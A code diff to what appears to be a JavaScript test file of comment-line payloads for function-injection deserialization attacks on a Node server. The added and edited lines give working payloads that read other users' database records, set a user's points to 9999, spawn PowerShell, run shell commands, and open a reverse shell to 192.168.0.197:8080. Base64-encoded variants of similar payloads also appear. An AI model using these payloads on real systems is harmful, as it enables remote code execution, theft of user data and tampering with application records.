@@ -27,7 +27,7 @@ export const test3 = {
     },
 }
 
-// eyJpZCI6IjEzMzciLCJwYXNzd29yZCI6ImhlbGxvIiwidGVzdCI6ZnVuY3Rpb24gKCkgewogICAgICAgIHJldHVybiBjb25zb2xlLmxvZygiZXZpbCBwYXlsb2FkIik7CiAgICB9LCJ0ZXN0MiI6dGVzdCgpfQo=
+// eyJpZCI6IjEzMzciLCJwYXNzd29yZCI6ImhlbGxvIiwidGVzdCI6ZnVuY3Rpb24gKCkgewogICAgICAgIHJldHVybiBjb25zb2xlLmxvZygiZXZpbCBwYXlsb2FkIik7CiAgICB9fQo=
 // @ts-ignore
 export const test4 = {
     id: '1337',
@@ -37,11 +37,18 @@ export const test4 = {
     payload_4: console.log(4),
 }
 
+// get user data of other users:
+// "{\"p1\": foo=function(){DATABASE = require('../server/application/database');console.log(DATABASE.getUserData('123'))},\"p2\":foo()}"
+
+// get some more points
+// "{\"p1\": foo=function(){DATABASE = require('../server/application/database');DATABASE.updatePoints('1337',9999);console.log(DATABASE.getUserData('1337'))},\"p2\":foo()}"
+// eyJwMSI6IGZvbz1mdW5jdGlvbigpe0RBVEFCQVNFID0gcmVxdWlyZSgnLi4vc2VydmVyL2FwcGxpY2F0aW9uL2RhdGFiYXNlJyk7REFUQUJBU0UudXBkYXRlUG9pbnRzKCcxMzM3Jyw5OTk5KTtjb25zb2xlLmxvZyhEQVRBQkFTRS5nZXRVc2VyRGF0YSgnMTMzNycpKX0sInAyIjpmb28oKX0=
+
 // spawn Powershell:
-// "{\"p1\": foo=function(){child_process.spawn('powershell.exe').stdout.on(\"data\",function(data){console.log(\"Powershell Data: \" + data);\n})},\"p2\":foo()}"
+// "{\"p1\": foo=function(){child_process=require('child_process');child_process.spawn('powershell.exe').stdout.on(\"data\",function(data){console.log(\"Powershell Data: \" + data);\n})},\"p2\":foo()}"
 
 // execute Powershell command:
-// "{\"p1\": foo=function(){child_process.exec('dir', {'shell':'powershell.exe'}, (error, stdout, stderr)=> {console.log(stdout)\n})},\"p2\":foo()}"
+// "{\"p1\": foo=function(){child_process=require('child_process');child_process.exec('dir', {'shell':'powershell.exe'}, (error, stdout, stderr)=> {console.log(stdout)\n})},\"p2\":foo()}"
 
 // reverse shell example:
-//"{\"p1\": foo=function(){let sh = child_process.spawn('powershell.exe');\nlet client = new net.Socket(); client.connect(8080, \"192.168.0.197\", function(){client.pipe(sh.stdin);sh.stdout.pipe(net.client);sh.stderr.pipe(net.client); return /a/})},\"p2\":foo()}"
+// "{\"p1\": foo=function(){child_process=require('child_process');let sh = child_process.spawn('powershell.exe');\nlet client = new net.Socket(); client.connect(8080, \"192.168.0.197\", function(){client.pipe(sh.stdin);sh.stdout.pipe(net.client);sh.stderr.pipe(net.client); return /a/})},\"p2\":foo()}"
